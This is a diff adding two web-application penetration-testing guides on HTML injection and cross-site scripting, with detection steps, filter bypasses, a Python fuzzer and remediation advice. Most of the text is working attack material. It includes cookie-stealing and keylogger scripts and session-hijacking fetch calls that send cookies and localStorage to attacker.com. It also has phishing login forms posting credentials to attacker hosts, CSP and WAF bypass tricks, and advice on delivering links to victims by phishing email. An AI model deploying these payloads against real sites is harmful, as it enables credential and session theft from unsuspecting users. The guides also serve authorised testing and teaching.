@@ -2455,3 +2455,996 @@ input[name="csrf"][value^="b"] { background: url(https://attacker.com/?token=b);
 .secret-text { font-family: probe; }
 /* Browser only loads the font for chars that actually appear in element */
 ```
+
+
+---
+
+## [HTML Injection Testing (zebbern)] Additional Techniques
+
+# HTML Injection Testing
+
+## Purpose
+
+Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.
+
+## Prerequisites
+
+### Required Tools
+- Web browser with developer tools
+- Burp Suite or OWASP ZAP
+- Tamper Data or similar proxy
+- cURL for testing payloads
+
+### Required Knowledge
+- HTML fundamentals
+- HTTP request/response structure
+- Web application input handling
+- Difference between HTML injection and XSS
+
+## Outputs and Deliverables
+
+1. **Vulnerability Report** - Identified injection points
+2. **Exploitation Proof** - Demonstrated content manipulation
+3. **Impact Assessment** - Potential phishing and defacement risks
+4. **Remediation Guidance** - Input validation recommendations
+
+## Core Workflow
+
+### Phase 1: Understanding HTML Injection
+
+HTML injection occurs when user input is reflected in web pages without proper sanitization:
+
+```html
+<!-- Vulnerable code example -->
+<div>
+    Welcome, <?php echo $_GET['name']; ?>
+</div>
+
+<!-- Attack input -->
+?name=<h1>Injected Content</h1>
+
+<!-- Rendered output -->
+<div>
+    Welcome, <h1>Injected Content</h1>
+</div>
+```
+
+Key differences from XSS:
+- HTML injection: Only HTML tags are rendered
+- XSS: JavaScript code is executed
+- HTML injection is often stepping stone to XSS
+
+Attack goals:
+- Modify website appearance (defacement)
+- Create fake login forms (phishing)
+- Inject malicious links
+- Display misleading content
+
+### Phase 2: Identifying Injection Points
+
+Map application for potential injection surfaces:
+
+```
+1. Search bars and search results
+2. Comment sections
+3. User profile fields
+4. Contact forms and feedback
+5. Registration forms
+6. URL parameters reflected on page
+7. Error messages
+8. Page titles and headers
+9. Hidden form fields
+10. Cookie values reflected on page
+```
+
+Common vulnerable parameters:
+```
+?name=
+?user=
+?search=
+?query=
+?message=
+?title=
+?content=
+?redirect=
+?url=
+?page=
+```
+
+### Phase 3: Basic HTML Injection Testing
+
+Test with simple HTML tags:
+
+```html
+<!-- Basic text formatting -->
+<h1>Test Injection</h1>
+<b>Bold Text</b>
+<i>Italic Text</i>
+<u>Underlined Text</u>
+<font color="red">Red Text</font>
+
+<!-- Structural elements -->
+<div style="background:red;color:white;padding:10px">Injected DIV</div>
+<p>Injected paragraph</p>
+<br><br><br>Line breaks
+
+<!-- Links -->
+<a href="http://attacker.com">Click Here</a>
+<a href="http://attacker.com">Legitimate Link</a>
+
+<!-- Images -->
+<img src="http://attacker.com/image.png">
+<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
+```
+
+Testing workflow:
+```bash
+# Test basic injection
+curl "http://target.com/search?q=<h1>Test</h1>"
+
+# Check if HTML renders in response
+curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"
+
+# Test in URL-encoded form
+curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
+```
+
+### Phase 4: Types of HTML Injection
+
+#### Stored HTML Injection
+
+Payload persists in database:
+
+```html
+<!-- Profile bio injection -->
+Name: John Doe
+Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
+     <h1>Site Under Maintenance</h1>
+     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
+     </div>
+
+<!-- Comment injection -->
+Great article!
+<form action="http://attacker.com/steal" method="POST">
+    <input name="username" placeholder="Session expired. Enter username:">
+    <input name="password" type="password" placeholder="Password:">
+    <input type="submit" value="Login">
+</form>
+```
+
+#### Reflected GET Injection
+
+Payload in URL parameters:
+
+```html
+<!-- URL injection -->
+http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
+
+<!-- Search result injection -->
+http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
+```
+
+#### Reflected POST Injection
+
+Payload in POST data:
+
+```bash
+# POST injection test
+curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
+     http://target.com/submit
+
+# Form field injection
+curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
+     http://target.com/register
+```
+
+#### URL-Based Injection
+
+Inject into displayed URLs:
+
+```html
+<!-- If URL is displayed on page -->
+http://target.com/page/<h1>Injected</h1>
+
+<!-- Path-based injection -->
+http://target.com/users/<img src=x>/profile
+```
+
+### Phase 5: Phishing Attack Construction
+
+Create convincing phishing forms:
+
+```html
+<!-- Fake login form overlay -->
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;
+            background:white;z-index:9999;padding:50px;">
+    <h2>Session Expired</h2>
+    <p>Your session has expired. Please log in again.</p>
+    <form action="http://attacker.com/capture" method="POST">
+        <label>Username:</label><br>
+        <input type="text" name="username" style="width:200px;"><br><br>
+        <label>Password:</label><br>
+        <input type="password" name="password" style="width:200px;"><br><br>
+        <input type="submit" value="Login">
+    </form>
+</div>
+
+<!-- Hidden credential stealer -->
+<style>
+    input { background: url('http://attacker.com/log?data=') }
+</style>
+<form action="http://attacker.com/steal" method="POST">
+    <input name="user" placeholder="Verify your username">
+    <input name="pass" type="password" placeholder="Verify your password">
+    <button>Verify</button>
+</form>
+```
+
+URL-encoded phishing link:
+```
+http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
+```
+
+### Phase 6: Defacement Payloads
+
+Website appearance manipulation:
+
+```html
+<!-- Full page overlay -->
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;
+            background:#000;color:#0f0;z-index:9999;
+            display:flex;justify-content:center;align-items:center;">
+    <h1>HACKED BY SECURITY TESTER</h1>
+</div>
+
+<!-- Content replacement -->
+<style>body{display:none}</style>
+<body style="display:block !important">
+    <h1>This site has been compromised</h1>
+</body>
+
+<!-- Image injection -->
+<img src="http://attacker.com/defaced.jpg" 
+     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
+
+<!-- Marquee injection (visible movement) -->
+<marquee behavior="alternate" style="font-size:50px;color:red;">
+    SECURITY VULNERABILITY DETECTED
+</marquee>
+```
+
+### Phase 7: Advanced Injection Techniques
+
+#### CSS Injection
+
+```html
+<!-- Style injection -->
+<style>
+    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
+    .content { display: none }
+    .fake-content { display: block }
+</style>
+
+<!-- Inline style injection -->
+<div style="background:url('http://attacker.com/log')">Content</div>
+```
+
+#### Meta Tag Injection
+
+```html
+<!-- Redirect via meta refresh -->
+<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
+
+<!-- CSP bypass attempt -->
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+```
+
+#### Form Action Override
+
+```html
+<!-- Hijack existing form -->
+<form action="http://attacker.com/steal">
+
+<!-- If form already exists, add input -->
+<input type="hidden" name="extra" value="data">
+</form>
+```
+
+#### iframe Injection
+
+```html
+<!-- Embed external content -->
+<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>
+
+<!-- Invisible tracking iframe -->
+<iframe src="http://attacker.com/track" style="display:none"></iframe>
+```
+
+### Phase 8: Bypass Techniques
+
+Evade basic filters:
+
+```html
+<!-- Case variations -->
+<H1>Test</H1>
+<ScRiPt>alert(1)</ScRiPt>
+
+<!-- Encoding variations -->
+&#60;h1&#62;Encoded&#60;/h1&#62;
+%3Ch1%3EURL%20Encoded%3C%2Fh1%3E
+
+<!-- Tag splitting -->
+<h
+1>Split Tag</h1>
+
+<!-- Null bytes -->
+<h1%00>Null Byte</h1>
+
+<!-- Double encoding -->
+%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E
+
+<!-- Unicode encoding -->
+\u003ch1\u003eUnicode\u003c/h1\u003e
+
+<!-- Attribute-based -->
+<div onmouseover="alert(1)">Hover me</div>
+<img src=x onerror=alert(1)>
+```
+
+### Phase 9: Automated Testing
+
+#### Using Burp Suite
+
+```
+1. Capture request with potential injection point
+2. Send to Intruder
+3. Mark parameter value as payload position
+4. Load HTML injection wordlist
+5. Start attack
+6. Filter responses for rendered HTML
+7. Manually verify successful injections
+```
+
+#### Using OWASP ZAP
+
+```
+1. Spider the target application
+2. Active Scan with HTML injection rules
+3. Review Alerts for injection findings
+4. Validate findings manually
+```
+
+#### Custom Fuzzing Script
+
+```python
+#!/usr/bin/env python3
+import requests
+import urllib.parse
+
+target = "http://target.com/search"
+param = "q"
+
+payloads = [
+    "<h1>Test</h1>",
+    "<b>Bold</b>",
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<a href='http://evil.com'>Click</a>",
+    "<div style='color:red'>Styled</div>",
+    "<marquee>Moving</marquee>",
+    "<iframe src='http://evil.com'></iframe>",
+]
+
+for payload in payloads:
+    encoded = urllib.parse.quote(payload)
+    url = f"{target}?{param}={encoded}"
+    
+    try:
+        response = requests.get(url, timeout=5)
+        if payload.lower() in response.text.lower():
+            print(f"[+] Possible injection: {payload}")
+        elif "<h1>" in response.text or "<b>" in response.text:
+            print(f"[?] Partial reflection: {payload}")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+```
+
+### Phase 10: Prevention and Remediation
+
+Secure coding practices:
+
+```php
+// PHP: Escape output
+echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+
+// PHP: Strip tags
+echo strip_tags($user_input);
+
+// PHP: Allow specific tags only
+echo strip_tags($user_input, '<p><b><i>');
+```
+
+```python
+# Python: HTML escape
+from html import escape
+safe_output = escape(user_input)
+
+# Python Flask: Auto-escaping
+{{ user_input }}  # Jinja2 escapes by default
+{{ user_input | safe }}  # Marks as safe (dangerous!)
+```
+
+```javascript
+// JavaScript: Text content (safe)
+element.textContent = userInput;
+
+// JavaScript: innerHTML (dangerous!)
+element.innerHTML = userInput;  // Vulnerable!
+
+// JavaScript: Sanitize
+const clean = DOMPurify.sanitize(userInput);
+element.innerHTML = clean;
+```
+
+Server-side protections:
+- Input validation (whitelist allowed characters)
+- Output encoding (context-aware escaping)
+- Content Security Policy (CSP) headers
+- Web Application Firewall (WAF) rules
+
+## Quick Reference
+
+### Common Test Payloads
+
+| Payload | Purpose |
+|---------|---------|
+| `<h1>Test</h1>` | Basic rendering test |
+| `<b>Bold</b>` | Simple formatting |
+| `<a href="evil.com">Link</a>` | Link injection |
+| `<img src=x>` | Image tag test |
+| `<div style="color:red">` | Style injection |
+| `<form action="evil.com">` | Form hijacking |
+
+### Injection Contexts
+
+| Context | Test Approach |
+|---------|---------------|
+| URL parameter | `?param=<h1>test</h1>` |
+| Form field | POST with HTML payload |
+| Cookie value | Inject via document.cookie |
+| HTTP header | Inject in Referer/User-Agent |
+| File upload | HTML file with malicious content |
+
+### Encoding Types
+
+| Type | Example |
+|------|---------|
+| URL encoding | `%3Ch1%3E` = `<h1>` |
+| HTML entities | `&#60;h1&#62;` = `<h1>` |
+| Double encoding | `%253C` = `<` |
+| Unicode | `\u003c` = `<` |
+
+## Constraints and Limitations
+
+### Attack Limitations
+- Modern browsers may sanitize some injections
+- CSP can prevent inline styles and scripts
+- WAFs may block common payloads
+- Some applications escape output properly
+
+### Testing Considerations
+- Distinguish between HTML injection and XSS
+- Verify visual impact in browser
+- Test in multiple browsers
+- Check for stored vs reflected
+
+### Severity Assessment
+- Lower severity than XSS (no script execution)
+- Higher impact when combined with phishing
+- Consider defacement/reputation damage
+- Evaluate credential theft potential
+
+## Troubleshooting
+
+| Issue | Solutions |
+|-------|-----------|
+| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
+| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
+| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |
+
+
+---
+
+## [XSS + HTML Injection (zebbern)] Additional Techniques
+
+# Cross-Site Scripting and HTML Injection Testing
+
+## Purpose
+
+Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.
+
+## Inputs / Prerequisites
+
+### Required Access
+- Target web application URL with user input fields
+- Burp Suite or browser developer tools for request analysis
+- Access to create test accounts for stored XSS testing
+- Browser with JavaScript console enabled
+
+### Technical Requirements
+- Understanding of JavaScript execution in browser context
+- Knowledge of HTML DOM structure and manipulation
+- Familiarity with HTTP request/response headers
+- Understanding of cookie attributes and session management
+
+### Legal Prerequisites
+- Written authorization for security testing
+- Defined scope including target domains and features
+- Agreement on handling of any captured session data
+- Incident response procedures established
+
+## Outputs / Deliverables
+
+- XSS/HTMLi vulnerability report with severity classifications
+- Proof-of-concept payloads demonstrating impact
+- Session hijacking demonstrations (controlled environment)
+- Remediation recommendations with CSP configurations
+
+## Core Workflow
+
+### Phase 1: Vulnerability Detection
+
+#### Identify Input Reflection Points
+Locate areas where user input is reflected in responses:
+
+```
+# Common injection vectors
+- Search boxes and query parameters
+- User profile fields (name, bio, comments)
+- URL fragments and hash values
+- Error messages displaying user input
+- Form fields with client-side validation only
+- Hidden form fields and parameters
+- HTTP headers (User-Agent, Referer)
+```
+
+#### Basic Detection Testing
+Insert test strings to observe application behavior:
+
+```html
+<!-- Basic reflection test -->
+<test123>
+
+<!-- Script tag test -->
+<script>alert('XSS')</script>
+
+<!-- Event handler test -->
+<img src=x onerror=alert('XSS')>
+
+<!-- SVG-based test -->
+<svg onload=alert('XSS')>
+
+<!-- Body event test -->
+<body onload=alert('XSS')>
+```
+
+Monitor for:
+- Raw HTML reflection without encoding
+- Partial encoding (some characters escaped)
+- JavaScript execution in browser console
+- DOM modifications visible in inspector
+
+#### Determine XSS Type
+
+**Stored XSS Indicators:**
+- Input persists after page refresh
+- Other users see injected content
+- Content stored in database/filesystem
+
+**Reflected XSS Indicators:**
+- Input appears only in current response
+- Requires victim to click crafted URL
+- No persistence across sessions
+
+**DOM-Based XSS Indicators:**
+- Input processed by client-side JavaScript
+- Server response doesn't contain payload
+- Exploitation occurs entirely in browser
+
+### Phase 2: Stored XSS Exploitation
+
+#### Identify Storage Locations
+Target areas with persistent user content:
+
+```
+- Comment sections and forums
+- User profile fields (display name, bio, location)
+- Product reviews and ratings
+- Private messages and chat systems
+- File upload metadata (filename, description)
+- Configuration settings and preferences
+```
+
+#### Craft Persistent Payloads
+
+```html
+<!-- Cookie stealing payload -->
+<script>
+document.location='http://attacker.com/steal?c='+document.cookie
+</script>
+
+<!-- Keylogger injection -->
+<script>
+document.onkeypress=function(e){
+  new Image().src='http://attacker.com/log?k='+e.key;
+}
+</script>
+
+<!-- Session hijacking -->
+<script>
+fetch('http://attacker.com/capture',{
+  method:'POST',
+  body:JSON.stringify({cookies:document.cookie,url:location.href})
+})
+</script>
+
+<!-- Phishing form injection -->
+<div id="login">
+<h2>Session Expired - Please Login</h2>
+<form action="http://attacker.com/phish" method="POST">
+Username: <input name="user"><br>
+Password: <input type="password" name="pass"><br>
+<input type="submit" value="Login">
+</form>
+</div>
+```
+
+### Phase 3: Reflected XSS Exploitation
+
+#### Construct Malicious URLs
+Build URLs containing XSS payloads:
+
+```
+# Basic reflected payload
+https://target.com/search?q=<script>alert(document.domain)</script>
+
+# URL-encoded payload
+https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E
+
+# Event handler in parameter
+https://target.com/page?name="><img src=x onerror=alert(1)>
+
+# Fragment-based (for DOM XSS)
+https://target.com/page#<script>alert(1)</script>
+```
+
+#### Delivery Methods
+Techniques for delivering reflected XSS to victims:
+
+```
+1. Phishing emails with crafted links
+2. Social media message distribution
+3. URL shorteners to obscure payload
+4. QR codes encoding malicious URLs
+5. Redirect chains through trusted domains
+```
+
+### Phase 4: DOM-Based XSS Exploitation
+
+#### Identify Vulnerable Sinks
+Locate JavaScript functions that process user input:
+
+```javascript
+// Dangerous sinks
+document.write()
+document.writeln()
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML()
+eval()
+setTimeout()
+setInterval()
+Function()
+location.href
+location.assign()
+location.replace()
+```
+
+#### Identify Sources
+Locate where user-controlled data enters the application:
+
+```javascript
+// User-controllable sources
+location.hash
+location.search
+location.href
+document.URL
+document.referrer
+window.name
+postMessage data
+localStorage/sessionStorage
+```
+
+#### DOM XSS Payloads
+
+```javascript
+// Hash-based injection
+https://target.com/page#<img src=x onerror=alert(1)>
+
+// URL parameter injection (processed client-side)
+https://target.com/page?default=<script>alert(1)</script>
+
+// PostMessage exploitation
+// On attacker page:
+<iframe src="https://target.com/vulnerable"></iframe>
+<script>
+frames[0].postMessage('<img src=x onerror=alert(1)>','*');
+</script>
+```
+
+### Phase 5: HTML Injection Techniques
+
+#### Reflected HTML Injection
+Modify page appearance without JavaScript:
+
+```html
+<!-- Content injection -->
+<h1>SITE HACKED</h1>
+
+<!-- Form hijacking -->
+<form action="http://attacker.com/capture">
+<input name="credentials" placeholder="Enter password">
+<button>Submit</button>
+</form>
+
+<!-- CSS injection for data exfiltration -->
+<style>
+input[value^="a"]{background:url(http://attacker.com/a)}
+input[value^="b"]{background:url(http://attacker.com/b)}
+</style>
+
+<!-- iframe injection -->
+<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
+```
+
+#### Stored HTML Injection
+Persistent content manipulation:
+
+```html
+<!-- Marquee disruption -->
+<marquee>Important Security Notice: Your account is compromised!</marquee>
+
+<!-- Style override -->
+<style>body{background:red !important;}</style>
+
+<!-- Hidden content with CSS -->
+<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
+Fake login form or misleading content here
+</div>
+```
+
+### Phase 6: Filter Bypass Techniques
+
+#### Tag and Attribute Variations
+
+```html
+<!-- Case variation -->
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+
+<!-- Alternative tags -->
+<svg/onload=alert(1)>
+<body/onload=alert(1)>
+<marquee/onstart=alert(1)>
+<details/open/ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+<!-- Malformed tags -->
+<img src=x onerror=alert(1)//
+<img """><script>alert(1)</script>">
+```
+
+#### Encoding Bypass
+
+```html
+<!-- HTML entity encoding -->
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+
+<!-- Hex encoding -->
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+
+<!-- Unicode encoding -->
+<script>\u0061lert(1)</script>
+
+<!-- Mixed encoding -->
+<img src=x onerror=\u0061\u006cert(1)>
+```
+
+#### JavaScript Obfuscation
+
+```javascript
+// String concatenation
+<script>eval('al'+'ert(1)')</script>
+
+// Template literals
+<script>alert`1`</script>
+
+// Constructor execution
+<script>[].constructor.constructor('alert(1)')()</script>
+
+// Base64 encoding
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+// Without parentheses
+<script>alert`1`</script>
+<script>throw/a]a]/.source+onerror=alert</script>
+```
+
+#### Whitespace and Comment Bypass
+
+```html
+<!-- Tab/newline insertion -->
+<img src=x	onerror
+=alert(1)>
+
+<!-- JavaScript comments -->
+<script>/**/alert(1)/**/</script>
+
+<!-- HTML comments in attributes -->
+<img src=x onerror="alert(1)"<!--comment-->
+```
+
+## Quick Reference
+
+### XSS Detection Checklist
+```
+1. Insert <script>alert(1)</script> â†’ Check execution
+2. Insert <img src=x onerror=alert(1)> â†’ Check event handler
+3. Insert "><script>alert(1)</script> â†’ Test attribute escape
+4. Insert javascript:alert(1) â†’ Test href/src attributes
+5. Check URL hash handling â†’ DOM XSS potential
+```
+
+### Common XSS Payloads
+
+| Context | Payload |
+|---------|---------|
+| HTML body | `<script>alert(1)</script>` |
+| HTML attribute | `"><script>alert(1)</script>` |
+| JavaScript string | `';alert(1)//` |
+| JavaScript template | `${alert(1)}` |
+| URL attribute | `javascript:alert(1)` |
+| CSS context | `</style><script>alert(1)</script>` |
+| SVG context | `<svg onload=alert(1)>` |
+
+### Cookie Theft Payload
+```javascript
+<script>
+new Image().src='http://attacker.com/c='+btoa(document.cookie);
+</script>
+```
+
+### Session Hijacking Template
+```javascript
+<script>
+fetch('https://attacker.com/log',{
+  method:'POST',
+  mode:'no-cors',
+  body:JSON.stringify({
+    cookies:document.cookie,
+    localStorage:JSON.stringify(localStorage),
+    url:location.href
+  })
+});
+</script>
+```
+
+## Constraints and Guardrails
+
+### Operational Boundaries
+- Never inject payloads that could damage production systems
+- Limit cookie/session capture to demonstration purposes only
+- Avoid payloads that could spread to unintended users (worm behavior)
+- Do not exfiltrate real user data beyond scope requirements
+
+### Technical Limitations
+- Content Security Policy (CSP) may block inline scripts
+- HttpOnly cookies prevent JavaScript access
+- SameSite cookie attributes limit cross-origin attacks
+- Modern frameworks often auto-escape outputs
+
+### Legal and Ethical Requirements
+- Written authorization required before testing
+- Report critical XSS vulnerabilities immediately
+- Handle captured credentials per data protection agreements
+- Do not use discovered vulnerabilities for unauthorized access
+
+## Examples
+
+### Example 1: Stored XSS in Comment Section
+
+**Scenario**: Blog comment feature vulnerable to stored XSS
+
+**Detection**:
+```
+POST /api/comments
+Content-Type: application/json
+
+{"body": "<script>alert('XSS')</script>", "postId": 123}
+```
+
+**Observation**: Comment renders and script executes for all viewers
+
+**Exploitation Payload**:
+```html
+<script>
+var i = new Image();
+i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+</script>
+```
+
+**Result**: Every user viewing the comment has their session cookie sent to attacker's server.
+
+### Example 2: Reflected XSS via Search Parameter
+
+**Scenario**: Search results page reflects query without encoding
+
+**Vulnerable URL**:
+```
+https://shop.example.com/search?q=test
+```
+
+**Detection Test**:
+```
+https://shop.example.com/search?q=<script>alert(document.domain)</script>
+```
+
+**Crafted Attack URL**:
+```
+https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
+```
+
+**Delivery**: URL sent via phishing email to target user.
+
+### Example 3: DOM-Based XSS via Hash Fragment
+
+**Scenario**: JavaScript reads URL hash and inserts into DOM
+
+**Vulnerable Code**:
+```javascript
+document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
+```
+
+**Attack URL**:
+```
+https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
+```
+
+**Result**: Script executes entirely client-side; payload never touches server.
+
+### Example 4: CSP Bypass via JSONP Endpoint
+
+**Scenario**: Site has CSP but allows trusted CDN
+
+**CSP Header**:
+```
+Content-Security-Policy: script-src 'self' https://cdn.trusted.com
+```
+
+**Bypass**: Find JSONP endpoint on trusted domain:
+```html
+<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
+```
+
+**Result**: CSP bypassed using allowed script source.
+
+## Troubleshooting
+
+| Issue | Solutions |
+|-------|-----------|
+| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
+| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
+| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
+| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
+| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
